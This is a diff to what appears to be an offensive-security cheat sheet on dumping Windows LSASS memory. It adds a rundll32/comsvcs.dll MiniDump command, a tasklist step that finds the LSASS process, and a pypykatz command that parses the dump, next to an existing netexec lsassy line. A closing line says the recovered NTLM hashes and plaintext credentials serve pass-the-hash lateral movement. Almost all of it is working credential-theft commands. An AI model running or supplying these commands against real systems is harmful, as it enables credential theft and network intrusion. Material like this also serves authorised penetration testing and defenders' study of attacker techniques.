@@ -32,5 +32,15 @@
 
  - netexec smb IP_RANGE -u USER -p 'PASSWORD' -M lsassy
 
+#### 7) rundll32.exe
+
+ - tasklist | findstr lsass
+
+ - C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\LSASS.dmp
+
+#### 8) Pypykatz
+
+ - pypykatz lsa minidump lsass.dmp
+
 ### With LSASS dumped, you can recover NTLM Hashes as well as clertext credentials to do Lateral Movement via Pass-the-Hash or Pass-the-Key
 
